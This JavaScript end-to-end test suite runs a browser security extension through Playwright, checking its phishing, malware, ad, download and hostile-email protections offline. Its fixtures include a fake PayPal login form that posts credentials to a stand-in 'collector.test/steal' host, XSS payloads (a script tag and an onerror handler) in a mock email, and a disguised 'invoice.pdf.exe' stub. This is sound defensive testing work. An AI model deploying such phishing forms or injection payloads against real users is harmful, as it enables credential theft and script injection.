// End-to-end tests: load the built extension (dist/chrome) into Playwright's
// Chromium and exercise every feature through the real UI. Hostnames are
// mapped to a local server with --host-resolver-rules, so phishing/malware
// scenarios run fully offline.
//
//   npm run test:e2e
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { spawn } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { chromium } from "playwright";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const EXT = path.join(root, "dist", "chrome");
if (!existsSync(path.join(EXT, "manifest.json"))) throw new Error("Run `npm run build:chrome` first");

const RESOURCES = JSON.parse(readFileSync(path.join(EXT, "manifest.json"))).declarative_net_request.rule_resources;
const loadRules = (prefix) => RESOURCES.filter((r) => r.id.startsWith(prefix)).flatMap((r) => JSON.parse(readFileSync(path.join(EXT, r.path))));
const malwareRules = loadRules("nv_malware");
const adRules = loadRules("nv_ads");
const pickDomain = (rules, pred = () => true) => rules.filter(pred).flatMap((r) => r.condition.requestDomains).find((d) => /^[a-z][a-z0-9-]*(\.[a-z0-9-]+)+$/.test(d));
const MAL_DOMAIN = pickDomain(malwareRules, (r) => r.action.type === "redirect");
const AD_DOMAIN = pickDomain(adRules);

let server, PORT, ctx, extId, sw, profile, remote, remoteProfile;
const hits = new Map();
const pageErrors = [];

function fakePE() {
  const b = Buffer.alloc(1024);
  b.write("MZ", 0);
  b.writeUInt32LE(0x80, 0x3c);
  b.write("PE\0\0", 0x80, "latin1");
  return b;
}

function minimalPdf() {
  const objs = [
    "<< /Type /Catalog /Pages 2 0 R >>",
    "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 200] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
    null,
    "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
  ];
  const stream = "BT /F1 24 Tf 40 100 Td (NULL VOID) Tj ET";
  objs[3] = `<< /Length ${stream.length} >>\nstream\n${stream}\nendstream`;
  let out = "%PDF-1.4\n";
  const offsets = [];
  objs.forEach((o, i) => {
    offsets.push(out.length);
    out += `${i + 1} 0 obj\n${o}\nendobj\n`;
  });
  const xref = out.length;
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, "0")} 00000 n \n`).join("")}`;
  out += `trailer\n<< /Size ${objs.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(out, "latin1");
}

const PAGES = {
  "/": "<!doctype html><title>Home</title><h1>Welcome home</h1>",
  "/verify": "<!doctype html><title>Verify</title><h1>verify page</h1>",
  "/phish": `<!doctype html><title>PayPal - Log in to your account</title><h1>PayPal</h1>
    <form action="http://collector.test:PORT/steal" method="post"><input name="email"><input type="password" name="pw"><button>Log in</button></form>`,
  "/ads-page": `<!doctype html><title>Ads</title><script src="/first-party.js"></script><script src="http://AD:PORT/ad.js"></script>`,
  "/first-party.js": "window.firstParty = true;",
  "/ad.js": "window.adLoaded = true;",
  "/rbi": "<!doctype html><title>RBI target</title><body style='background:#2b6cff;color:#fff;font:40px sans-serif'><h1>Isolated page</h1><input id='q'></body>",
};

before(async () => {
  server = http.createServer((req, res) => {
    const url = new URL(req.url, "http://x");
    hits.set(url.pathname, (hits.get(url.pathname) || 0) + 1);
    if (url.pathname === "/invoice.pdf.exe" || url.pathname === "/setup.exe") {
      const name = url.pathname.slice(1);
      res.writeHead(200, { "content-type": "application/octet-stream", "content-disposition": `attachment; filename="${name}"` });
      return res.end(fakePE());
    }
    const body = PAGES[url.pathname];
    if (!body) {
      res.writeHead(404);
      return res.end("not found");
    }
    res.writeHead(200, { "content-type": url.pathname.endsWith(".js") ? "text/javascript" : "text/html" });
    res.end(body.replaceAll("PORT", String(PORT)).replaceAll("AD", AD_DOMAIN));
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  PORT = server.address().port;

  profile = mkdtempSync(path.join(tmpdir(), "nv-e2e-"));
  ctx = await chromium.launchPersistentContext(profile, {
    channel: "chromium",
    headless: true,
    acceptDownloads: true,
    viewport: { width: 1280, height: 860 },
    args: [
      `--disable-extensions-except=${EXT}`,
      `--load-extension=${EXT}`,
      "--host-resolver-rules=MAP * 127.0.0.1, EXCLUDE localhost",
    ],
  });
  for (let i = 0; i < 80 && !(sw = ctx.serviceWorkers()[0]); i++) await new Promise((r) => setTimeout(r, 250));
  assert.ok(sw, "service worker started");
  extId = new URL(sw.url()).host;
  // Wait until onInstalled finished (it opens the welcome page). Chrome only
  // learns which events a brand-new extension listens to after its first run,
  // so navigations in the first instants after install are not observed.
  for (let i = 0; i < 80 && !ctx.pages().some((p) => p.url().includes("options/options.html#welcome")); i++) await new Promise((r) => setTimeout(r, 250));
  ctx.on("page", (p) => watch(p));
  for (const p of ctx.pages()) watch(p);
});

after(async () => {
  await ctx?.close();
  remote?.kill();
  server?.close();
  for (const dir of [profile, remoteProfile]) {
    try { if (dir) rmSync(dir, { recursive: true, force: true }); } catch { /* locked on Windows */ }
  }
});

function watch(page) {
  page.on("pageerror", (e) => {
    if (page.url().startsWith("chrome-extension://")) pageErrors.push(`${page.url()}: ${e.message}`);
  });
  page.on("console", (m) => {
    if (m.type() === "error" && page.url().startsWith("chrome-extension://") && !/net::ERR|Failed to load resource/.test(m.text())) {
      pageErrors.push(`${page.url()}: ${m.text()}`);
    }
  });
}

const ext = (p) => `chrome-extension://${extId}/${p}`;
const web = (host, p = "/") => `http://${host}:${PORT}${p}`;

async function gotoSafe(page, url) {
  // Navigations that the extension redirects are reported as aborted; that's expected.
  await page.goto(url, { waitUntil: "domcontentloaded" }).catch(() => {});
}

/** Poll the page URL (waitForURL can miss navigations started by chrome.tabs.update). */
async function waitUrl(page, test, ms = 10000) {
  const match = typeof test === "string" ? (u) => u === test : (u) => test.test(u);
  const end = Date.now() + ms;
  while (!match(page.url())) {
    if (Date.now() > end) throw new Error(`Timed out waiting for URL ${test}; at ${page.url()}`);
    await new Promise((r) => setTimeout(r, 100));
  }
  await page.waitForLoadState("domcontentloaded").catch(() => {});
}

async function setSettings(patch) {
  await sw.evaluate(async (p) => {
    const key = "nv.settings";
    const cur = (await chrome.storage.local.get(key))[key];
    const merge = (a, b) => {
      for (const [k, v] of Object.entries(b)) a[k] = v && typeof v === "object" && !Array.isArray(v) ? merge(a[k] || {}, v) : v;
      return a;
    };
    await chrome.storage.local.set({ [key]: merge(cur, p) });
  }, patch);
  await new Promise((r) => setTimeout(r, 400));
}

test("service worker enables both static rulesets and opens onboarding", async () => {
  const rulesets = await sw.evaluate(() => chrome.declarativeNetRequest.getEnabledRulesets());
  assert.deepEqual(rulesets.sort(), RESOURCES.map((r) => r.id).sort());
  let opened = false;
  for (let i = 0; i < 40 && !opened; i++) {
    opened = ctx.pages().some((p) => p.url().includes("options/options.html#welcome"));
    if (!opened) await new Promise((r) => setTimeout(r, 250));
  }
  assert.ok(opened, "welcome page opened on install");
});

test("every extension page loads without script errors", async () => {
  for (const p of ["popup/popup.html", "options/options.html#protection", "viewer/viewer.html", "assistant/assistant.html", "blocked/blocked.html?mode=link&url=https%3A%2F%2Fexample.com%2F"]) {
    const page = await ctx.newPage();
    await page.goto(ext(p));
    await page.waitForTimeout(800);
    await page.close();
  }
  assert.deepEqual(pageErrors, []);
});

test("look-alike phishing URL is stopped by the heuristic interstitial, and Proceed works", async () => {
  const page = await ctx.newPage();
  const target = web("paypal-secure-login.xyz", "/verify");
  await gotoSafe(page, target);
  await waitUrl(page, /blocked\/blocked\.html\?mode=heuristic/);
  await page.waitForSelector("text=Possible fake paypal site");
  assert.ok(await page.isVisible("text=paypal.com"));
  page.once("dialog", (d) => d.accept());
  await page.click("text=Proceed anyway");
  await waitUrl(page, target);
  assert.equal(await page.textContent("h1"), "verify page");
  await page.close();
});

test("known malware host is redirected by the static ruleset", async () => {
  await setSettings({ protection: { heuristics: "off" } }); // isolate the blocklist from URL heuristics
  const page = await ctx.newPage();
  await gotoSafe(page, web(MAL_DOMAIN));
  await waitUrl(page, /blocked\/blocked\.html\?mode=list/);
  await page.waitForSelector("text=Dangerous site blocked");
  await page.waitForFunction((d) => document.getElementById("targetUrl")?.textContent.includes(d), MAL_DOMAIN);
  await page.close();
  await setSettings({ protection: { heuristics: "balanced" } });
});

test("third-party ad scripts are blocked, first-party scripts are not", async () => {
  hits.delete("/ad.js");
  const page = await ctx.newPage();
  await page.goto(web("news.test", "/ads-page"));
  await page.waitForFunction(() => window.firstParty === true);
  await page.waitForTimeout(500);
  assert.equal(await page.evaluate(() => window.adLoaded), undefined);
  assert.equal(hits.get("/ad.js") || 0, 0, "ad request never reached the server");
  await page.close();
});

test("credential-phishing page shows the in-page warning", async () => {
  const page = await ctx.newPage();
  await page.goto(web("account-center.test", "/phish"));
  await page.waitForSelector("nullvoid-guard", { state: "attached", timeout: 10000 });
  await page.close();
  const events = await sw.evaluate(async () => (await chrome.storage.local.get("nv.events"))["nv.events"] || []);
  assert.ok(events.some((e) => e.type === "page-warning"), "warning logged");
});

test("trusting a site disables protection there", async () => {
  await setSettings({ protection: { trustedSites: ["paypal-secure-login.xyz"] } });
  const page = await ctx.newPage();
  await page.goto(web("paypal-secure-login.xyz", "/"));
  await page.waitForTimeout(800);
  assert.ok(page.url().startsWith("http://paypal-secure-login.xyz"));
  await page.close();
  await setSettings({ protection: { trustedSites: [] } });
});

test("options page persists settings", async () => {
  const page = await ctx.newPage();
  await page.goto(ext("options/options.html#protection"));
  const toggle = page.locator('[data-setting="protection.cosmetic"]');
  const before = await toggle.isChecked();
  await toggle.click();
  await page.waitForTimeout(500);
  const stored = await sw.evaluate(async () => (await chrome.storage.local.get("nv.settings"))["nv.settings"].protection.cosmetic);
  assert.equal(stored, !before);
  await page.selectOption('[data-setting="protection.heuristics"]', "strict");
  await page.waitForTimeout(400);
  assert.equal(await sw.evaluate(async () => (await chrome.storage.local.get("nv.settings"))["nv.settings"].protection.heuristics), "strict");
  await toggle.click();
  await page.selectOption('[data-setting="protection.heuristics"]', "balanced");
  await page.close();
});

test("secure file viewer flags a disguised executable", async () => {
  const page = await ctx.newPage();
  await page.goto(ext("viewer/viewer.html"));
  await page.setInputFiles("#fileInput", { name: "invoice.pdf.exe", mimeType: "application/pdf", buffer: fakePE() });
  await page.waitForSelector("#verdict h2");
  assert.equal(await page.textContent("#verdict h2"), "Very likely malicious");
  assert.ok(await page.isVisible("text=Deceptive double extension"));
  assert.ok(await page.isVisible("text=Preview is disabled for executable"));
  await page.close();
});

test("secure file viewer renders a PDF with PDF.js", async () => {
  const page = await ctx.newPage();
  await page.goto(ext("viewer/viewer.html"));
  await page.setInputFiles("#fileInput", { name: "hello.pdf", mimeType: "application/pdf", buffer: minimalPdf() });
  await page.waitForSelector("canvas.pdf-page", { timeout: 15000 });
  assert.equal(await page.textContent("#verdict h2"), "No obvious threats");
  await page.close();
  assert.deepEqual(pageErrors, []);
});

async function triggerDownload(page, pathname) {
  await page.goto(web("files.test", "/")).catch(() => {});
  await page.evaluate((u) => {
    const a = document.createElement("a");
    a.href = u;
    a.download = u.split("/").pop();
    document.body.appendChild(a);
    a.click();
  }, web("files.test", pathname));
}

test("executable download is paused for review", async () => {
  const page = await ctx.newPage();
  const review = ctx.waitForEvent("page", { predicate: (p) => p.url().includes("mode=download"), timeout: 15000 });
  await triggerDownload(page, "/setup.exe");
  const reviewPage = await review;
  await reviewPage.waitForSelector("text=Risky download paused");
  assert.ok(await reviewPage.isVisible("text=setup.exe"));
  await reviewPage.click("text=Delete file");
  await page.close();
});

test("deceptive double-extension download is blocked outright", async () => {
  const page = await ctx.newPage();
  await triggerDownload(page, "/invoice.pdf.exe");
  let blocked = null;
  for (let i = 0; i < 40 && !blocked; i++) {
    await new Promise((r) => setTimeout(r, 250));
    const events = await sw.evaluate(async () => (await chrome.storage.local.get("nv.events"))["nv.events"] || []);
    blocked = events.find((e) => e.type === "download-blocked");
  }
  assert.ok(blocked, "download-blocked event recorded");
  assert.match(blocked.title, /invoice\.pdf\.exe/);
  await page.close();
});

test("AI assistant explains how to configure a missing key", async () => {
  const page = await ctx.newPage();
  await page.goto(ext("assistant/assistant.html"));
  await page.fill("#input", "hello");
  await page.press("#input", "Enter");
  await page.waitForSelector(".bubble.error");
  assert.match(await page.textContent(".bubble.error"), /Anthropic API key/);
  assert.ok(await page.isVisible("text=Open AI settings"));
  await page.close();
});

test("disposable browser streams a remote page over CDP and forwards input", async () => {
  remoteProfile = mkdtempSync(path.join(tmpdir(), "nv-remote-"));
  remote = spawn(chromium.executablePath(), [
    "--headless=new", "--remote-debugging-port=0", "--remote-allow-origins=*", `--user-data-dir=${remoteProfile}`, "--no-first-run", "about:blank",
  ], { stdio: ["ignore", "ignore", "pipe"] });
  const wsUrl = await new Promise((resolve, reject) => {
    let buf = "";
    const t = setTimeout(() => reject(new Error("remote chromium did not start")), 30000);
    remote.stderr.on("data", (d) => {
      buf += d;
      const m = buf.match(/DevTools listening on (ws:\/\/\S+)/);
      if (m) {
        clearTimeout(t);
        resolve(m[1]);
      }
    });
  });
  const devtools = `http://127.0.0.1:${new URL(wsUrl).port}`;
  await setSettings({ rbi: { mode: "cloud", provider: "custom", customEndpoint: devtools, idleMinutes: 10 } });

  const page = await ctx.newPage();
  await page.goto(ext(`rbi/rbi.html?url=${encodeURIComponent(`http://127.0.0.1:${PORT}/rbi`)}`));
  await page.waitForSelector("#overlay", { state: "hidden", timeout: 30000 });
  await page.waitForFunction(() => document.getElementById("url").value.endsWith("/rbi"), null, { timeout: 15000 });
  // The canvas shows the remote page's blue background.
  await page.waitForFunction(() => {
    const c = document.getElementById("screen");
    const d = c.getContext("2d").getImageData(Math.floor(c.width / 2), Math.floor(c.height - 20), 1, 1).data;
    return d[2] > 200 && d[0] < 120;
  }, null, { timeout: 15000 });
  await page.waitForFunction(() => document.title.startsWith("RBI target"), null, { timeout: 10000 });

  // Navigate via the URL bar.
  await page.fill("#url", `http://127.0.0.1:${PORT}/`);
  await page.press("#url", "Enter");
  await page.waitForFunction(() => document.title.startsWith("Home"), null, { timeout: 15000 });

  page.once("dialog", (d) => d.accept());
  await page.click("#end");
  await page.waitForSelector("text=Session ended", { timeout: 10000 });
  await page.close();
});

test("disposable inbox renders a hostile e-mail safely (mocked mail.tm)", async () => {
  const address = "tester@maxxspace.com";
  const seed = await ctx.newPage();
  await seed.goto(ext("options/options.html"));
  await seed.evaluate(async (addr) => {
    const { setRecord } = await import(chrome.runtime.getURL("lib/vault.js"));
    await setRecord("mailboxes", [{ id: "acc1", address: addr, password: "pw", token: "tok", createdAt: Date.now() }]);
    await chrome.storage.local.set({ "nv.email.meta": { active: "acc1", boxes: [{ id: "acc1", address: addr, createdAt: Date.now(), label: "", unread: 1, total: 1, lastChecked: Date.now() }] } });
  }, address);
  await seed.close();

  const message = {
    id: "m1", from: { address: "service@paypal.com", name: "PayPal" }, to: [{ address }], subject: "Your verification code",
    intro: "Your code is 482913", seen: false, hasAttachments: true, createdAt: new Date().toISOString(),
    text: "Your code is 482913. Verify: https://paypa1-alerts.xyz/verify?t=1",
    html: [`<p>Your code is <b>482913</b></p><img src="https://tracker.example/p.gif" width="1" height="1">
      <a href="https://paypa1-alerts.xyz/verify?t=1">Verify account</a><script>parent.document.title='pwned'</script>
      <img src="x" onerror="parent.document.title='pwned'">`],
    attachments: [{ id: "a1", filename: "invoice.pdf.exe", contentType: "application/octet-stream", size: 1024, downloadUrl: "/messages/m1/attachment/a1" }],
  };
  const source = "Authentication-Results: mx.mail.tm; spf=fail smtp.mailfrom=paypa1-alerts.xyz; dkim=none; dmarc=fail header.from=paypal.com\r\nFrom: \"PayPal\" <service@paypal.com>\r\nReply-To: help@paypa1-alerts.xyz\r\nSubject: Your verification code\r\n\r\nbody";
  await ctx.route("https://api.mail.tm/**", async (route) => {
    const u = new URL(route.request().url());
    const json = (body) => route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(body) });
    if (u.pathname === "/messages") return json({ "hydra:member": [message], "hydra:totalItems": 1 });
    if (u.pathname === "/messages/m1" && route.request().method() === "GET") return json(message);
    if (u.pathname === "/messages/m1") return json({ ...message, seen: true });
    if (u.pathname === "/sources/m1") return json({ data: source });
    if (u.pathname === "/messages/m1/attachment/a1") return route.fulfill({ status: 200, contentType: "application/octet-stream", body: fakePE() });
    return route.fulfill({ status: 404, body: "{}" });
  });
  await ctx.route("https://mercure.mail.tm/**", (route) => route.fulfill({ status: 200, contentType: "text/event-stream", body: ": ok\n\n" }));

  const page = await ctx.newPage();
  await page.goto(ext("inbox/inbox.html"));
  await page.waitForSelector(".msg .code-chip");
  await page.click(".msg");
  await page.waitForSelector(".code-btn");
  assert.match(await page.textContent(".code-btn"), /482913/);
  await page.waitForSelector("text=1 remote image blocked, including 1 tracking pixel");
  const srcdoc = await page.getAttribute("#bodyFrame", "srcdoc");
  assert.ok(!/<script/i.test(srcdoc), "scripts removed");
  assert.ok(!/onerror/i.test(srcdoc), "event handlers removed");
  assert.ok(!srcdoc.includes("tracker.example"), "tracking pixel URL removed");
  assert.ok(srcdoc.includes("blocked/blocked.html?mode=link&amp;url=https%3A%2F%2Fpaypa1-alerts.xyz"), "links routed through the link checker");
  assert.notEqual(await page.title(), "pwned");
  await page.waitForSelector("text=SPF fail");
  assert.ok(await page.isVisible("text=DMARC fail"));
  assert.ok(await page.isVisible("text=Replies go to a different domain"));

  const viewer = ctx.waitForEvent("page", { predicate: (p) => p.url().includes("viewer/viewer.html?handoff="), timeout: 15000 });
  await page.click("text=Analyze safely");
  const v = await viewer;
  await v.waitForSelector("#verdict h2");
  assert.equal(await v.textContent("#verdict h2"), "Very likely malicious");
  assert.match(await v.textContent("#facts"), /E-mail from service@paypal\.com/);
  await v.close();
  await page.close();
  await ctx.unroute("https://api.mail.tm/**");
  await ctx.unroute("https://mercure.mail.tm/**");
});

test("no extension page logged errors during the run", () => {
  assert.deepEqual(pageErrors, []);
});
